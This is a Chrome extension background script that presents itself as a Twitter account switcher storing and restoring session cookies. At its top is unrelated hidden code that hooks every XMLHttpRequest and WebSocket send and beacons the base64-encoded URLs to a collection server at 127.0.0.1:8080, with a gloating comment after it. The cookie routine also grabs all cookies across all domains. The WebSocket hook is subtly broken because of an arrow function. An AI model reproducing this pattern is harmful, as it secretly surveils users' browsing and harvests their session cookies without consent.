function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// chrome.storage.sync.clear();

chrome.runtime.onMessage.addListener(function (m, sender, callback) {
    console.log('GOT MESSAGE', m.action, m.data);
    if (m.action === 'log_out') {
        saveSession(m.data, function () {
            deleteCookies(m.data.id, callback);
        });
        return true;
    } else if (m.action === 'switch_account') {
        saveSession(m.data, function () {
            deleteCookies(m.data.id, function () {
                restoreSession(m.data.restoreId, callback);
            });
        });
        return true;
    } else if (m.action === 'get_sessions') {
        getSessions(callback);
        return true;
    }
    return false;
});

var KEY_SESSIONS = 'sessions';
var TWITTER_URL = 'https://twitter.com';

function getCookies (callback) {
    chrome.cookies.getAll({ }, callback);
}

function deleteCookies (sessionName, callback) {
    getSession(sessionName, function (session) {
        var cookies = session.cookies;
        var callbackCount = 0;

        for (var i = 0; i < cookies.length; i++) {
            var cookie = cookies[i];

            deleteCookie(cookie.name, function () {
                if (++callbackCount === cookies.length) {
                    callback();
                }
            });
        }
    });
}

function deleteCookie (name, callback) {
    chrome.cookies.remove({ name: name, url: TWITTER_URL }, callback);
}

function getSessions (callback) {
    chrome.storage.sync.get(KEY_SESSIONS, function (items) {
        var sessions = JSON.parse(items[KEY_SESSIONS] || '{ }');
        callback(sessions);
    });
}

function getSession (id, callback) {
    getSessions(function (sessions) { callback(sessions[id]); });
}

function saveSession (data, callback) {
    var id = data.id;
    var fullname = data.fullname;
    var handle = data.handle;
    var avatar = data.avatar;

    getSessions(function (sessions, hostname) {

        getCookies(function (cookies) {

            var session = sessions[id];
            session = {
                created: session ? session.created : Date.now(),
                modified: Date.now(),
                fullname: fullname,
                handle: handle,
                avatar: avatar,
                id: id,
                cookies: cookies
            };

            sessions[id] = session;

            var toStore = { };
            toStore[KEY_SESSIONS] = JSON.stringify(sessions);

            console.log('Saving sessions', sessions);

            chrome.storage.sync.set(toStore, callback);
        });
    });
}

function restoreSession(id, callback) {
    getSession(id, function (session) {
        var finishedSaving = 0;
        cookies = JSON.parse(JSON.stringify(session.cookies));

        for (var j = 0; j < cookies.length; j++) {
            var cookie = {
                name: cookies[j].name,
                url: TWITTER_URL,
                value: cookies[j].value,
                secure: cookies[j].secure,
                domain: cookies[j].domain,
                path: cookies[j].path,
                httpOnly: cookies[j].httpOnly,
                storeId: cookies[j].storeId,
                expirationDate: cookies[j].expirationDate
            };

            chrome.cookies.set(cookie, function () {
                if (++finishedSaving === cookies.length) {
                    callback();
                }
            });
        }
    });
}
